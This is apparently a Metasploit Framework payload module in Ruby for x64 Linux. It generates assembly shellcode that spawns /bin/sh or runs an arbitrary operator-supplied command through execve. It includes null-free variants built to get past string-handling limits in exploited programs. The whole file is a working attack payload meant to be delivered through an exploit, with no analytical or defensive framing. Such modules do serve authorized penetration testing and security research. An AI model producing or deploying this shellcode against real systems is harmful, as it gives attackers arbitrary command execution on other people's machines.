##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 44

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'Execute an arbitrary command or just a /bin/sh shell',
      'Author'        => ['ricky',
                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64))

    register_options(
      [
        OptString.new('CMD',  [ false,  "The command string to execute" ]),
      ])
    register_advanced_options(
      [
        OptBool.new('NullFreeVersion', [ true, "Null-free shellcode version", false ])
      ])
  end

  def generate_stage(opts={})
    cmd             = datastore['CMD'] || ''
    nullfreeversion = datastore['NullFreeVersion']

    if cmd.empty?
      #
      # Builds the exec payload which executes a /bin/sh shell.
      # execve("/bin/sh", NULL, NULL)
      #
      if nullfreeversion
        # 22 bytes (null-free)
        payload = <<-EOS
            mov rax, 0x68732f6e69622f2f
            cdq                     ; edx = NULL

            push rdx
            push rax
            push rsp
            pop rdi                 ; "//bin/sh"

            push rdx
            pop rsi                 ; NULL

            push 0x3b
            pop rax

            syscall                 ; execve("//bin/sh", NULL, NULL)
        EOS

      else
        # 21 bytes (not null-free)
        payload = <<-EOS
            mov rax, 0x68732f6e69622f
            cdq                     ; edx = NULL

            push rax
            push rsp
            pop rdi                 ; "/bin/sh"

            push rdx
            pop rsi                 ; NULL

            push 0x3b
            pop rax

            syscall                 ; execve("/bin/sh", NULL, NULL)
        EOS
      end
    else
      #
      # Dynamically builds the exec payload based on the user's options.
      # execve("/bin/sh", ["/bin/sh", "-c", "CMD"], NULL)
      #
      pushw_c_opt = "dd 0x632d6866" # pushw 0x632d (metasm doesn't support pushw)

      if nullfreeversion
        if cmd.length > 0xffff
          raise RangeError, "CMD length has to be smaller than %d" % 0xffff, caller()
        end
        if cmd.length <= 0xff # 255
          breg = "bl"
        else
          breg = "bx"
          if (cmd.length & 0xff) == 0 # let's avoid zeroed bytes
            cmd += " "
          end
        end
        mov_cmd_len_to_breg = "mov #{breg}, #{cmd.length}"

        # 48 bytes without cmd (null-free)
        payload = <<-EOS
            mov rax, 0x68732f6e69622f2f
            cdq                     ; edx = NULL

            jmp tocall              ; jmp/call/pop cmd address
          afterjmp:
            pop rbp                 ; *CMD*

            push rdx
            pop rbx
            #{mov_cmd_len_to_breg}  ; mov (byte/word) (bl/bx), cmd.length
            mov [rbp + rbx], dl     ; NUL '\0' terminate cmd

            push rdx
            #{pushw_c_opt}
            push rsp
            pop rsi                 ; "-c"

            push rdx
            push rax
            push rsp
            pop rdi                 ; "//bin/sh"

            push rdx                ; NULL
            push rbp                ; *CMD*
            push rsi                ; "-c"
            push rdi                ; "//bin/sh"
            push rsp
            pop rsi                 ; ["//bin/sh", "-c", "*CMD*"]

            push 0x3b
            pop rax

            syscall                 ; execve("//bin/sh", ["//bin/sh", "-c", "*CMD*"], NULL)
          tocall:
            call afterjmp
            db "#{cmd}"             ; arbitrary command
        EOS
      else
        # 37 bytes without cmd (not null-free)
        payload = <<-EOS
            mov rax, 0x68732f6e69622f
            cdq                     ; edx = NULL

            push rax
            push rsp
            pop rdi                 ; "/bin/sh"

            push rdx
            #{pushw_c_opt}
            push rsp
            pop rsi                 ; "-c"

            push rdx                ; NULL
            call continue
            db "#{cmd}", 0x00       ; arbitrary command
          continue:
            push rsi                ; "-c"
            push rdi                ; "/bin/sh"
            push rsp
            pop rsi                 ; ["/bin/sh", "-c", "*CMD*"]

            push 0x3b
            pop rax

            syscall                 ; execve("/bin/sh", ["/bin/sh", "-c", "*CMD*"], NULL)
        EOS
      end
    end
    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
  end
end
